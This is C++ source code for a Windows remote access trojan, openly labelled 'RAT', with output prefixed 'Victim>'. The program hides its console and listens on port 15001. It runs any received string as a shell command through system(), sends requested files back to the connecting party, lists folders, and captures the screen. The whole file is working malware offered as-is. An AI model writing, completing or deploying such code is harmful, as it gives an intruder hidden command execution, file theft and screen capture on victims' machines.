#include <stdio.h>  
#include <winsock2.h>
#include <string>
#include <vector>
#include <io.h>
#include <fstream>
#include <iostream>
#include <atlimage.h>
using namespace std;
#pragma comment(lib,"ws2_32.lib")
#define PORT 15001
#define ERROR 0  
#define BUFFER_SIZE 1024
bool GetFiles(const char* szFileDir, vector<string>& files) {
    string strDir = szFileDir;
    if (strDir.at(strDir.length() - 1) != '\\')
        strDir += '\\';
    WIN32_FIND_DATA wfd;
    HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(), &wfd);
    if (hFind == INVALID_HANDLE_VALUE)
        return false;
    do {
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (_stricmp(wfd.cFileName, ".") != 0 && _stricmp(wfd.cFileName, "..") != 0)
                files.push_back("Folder:" + strDir + wfd.cFileName);
        }
        else {
            files.push_back("File:" + strDir + wfd.cFileName);
        }
    } while (FindNextFile(hFind, &wfd));
    FindClose(hFind);
    return true;
}
void ScreenShot()
{
    HDC hDCScreen = ::GetDC(NULL);
    int nBitPerPixel = GetDeviceCaps(hDCScreen, BITSPIXEL);
    int nWidthScreen = GetDeviceCaps(hDCScreen, HORZRES);
    int nHeightScreen = GetDeviceCaps(hDCScreen, VERTRES);
    CImage m_MyImage;
    m_MyImage.Create(nWidthScreen, nHeightScreen, nBitPerPixel);
    HDC hDCImg = m_MyImage.GetDC();
    BitBlt(hDCImg, 0, 0, nWidthScreen, nHeightScreen, hDCScreen, 0, 0, SRCCOPY);

    m_MyImage.Save("cap.png", Gdiplus::ImageFormatPNG);
    m_MyImage.ReleaseDC();
}
int main()
{
    FreeConsole();
    WSADATA WSAData;
    if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)
    {
        printf("Socket initialize failed!\n");
        exit(1);
    }
    SOCKET sock;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
    {
        printf("Socket created!\n");
        WSACleanup();
        exit(1);
    }
    struct sockaddr_in RATAddr;
    RATAddr.sin_family = AF_INET;
    RATAddr.sin_port = htons(PORT);
    RATAddr.sin_addr.s_addr = INADDR_ANY;
    if (bind(sock, (LPSOCKADDR)&RATAddr, sizeof(RATAddr)) == SOCKET_ERROR)
    {
        printf("Bind failed!\n");
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
    printf("RAT Socket Port:%d\n", ntohs(RATAddr.sin_port));
    if (listen(sock, 10) == SOCKET_ERROR)
    {
        printf("Listen failed!\n");
        closesocket(sock);
        WSACleanup();
        exit(1);
    }

    SOCKET msgsock;
    char buf[BUFFER_SIZE];
    while (true)
    {
        if ((msgsock = accept(sock, (LPSOCKADDR)0, (int*)0)) == INVALID_SOCKET)
        {
            printf("Accept failed!\n");
            continue;
        }
        memset(buf, 0, sizeof(buf));
        recv(msgsock, buf, BUFFER_SIZE, 0);
        if (buf[0] == 'e' && buf[1] == 'x' && buf[2] == 'i' && buf[3] == 't')
        {
            printf("Exit.\n");
            break;
        }
        printf("Victim>%s", buf);
        if (buf[0] == '$')
        {
            string FileName = buf;

            for (int i = 0; i < FileName.length(); i++) {
                if (i < FileName.length() - 1)
                    FileName[i] = FileName[i + 1];
            }
            FileName.erase(FileName.length() - 2);
            cout << FileName << endl;
            memset(buf, 0, BUFFER_SIZE);
            int length = 0;
            FILE* fp;
            fopen_s(&fp, FileName.c_str(), "rb");
            if (NULL != fp)
            {
                while ((length = fread(buf, sizeof(char), BUFFER_SIZE, fp)) > 0)
                {
                    if (send(msgsock, buf, length, 0) < 0)
                    {
                        break;
                    }
                    memset(buf, 0, BUFFER_SIZE);
                }

                fclose(fp);
            }
            else {
                printf("Cannot open file!\n");
            }
        }
        else if (buf[0] == '#') {
            string FolderName = buf;

            for (int i = 0; i < FolderName.length(); i++) {
                if (i < FolderName.length() - 1)
                    FolderName[i] = FolderName[i + 1];
            }
            FolderName.erase(FolderName.length() - 2);
            cout << FolderName << endl;
            vector<string> files;
            GetFiles(FolderName.c_str(), files);
            int size = files.size();
            ofstream out("list.txt");
            for (int i = 0; i < size; i++)
            {
                out << files[i].c_str() << endl;
            }
            out.close();
        }
        else if (buf[0] == '%') {
            ScreenShot();
        }
        else {
            system(buf);
        }

        closesocket(msgsock);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}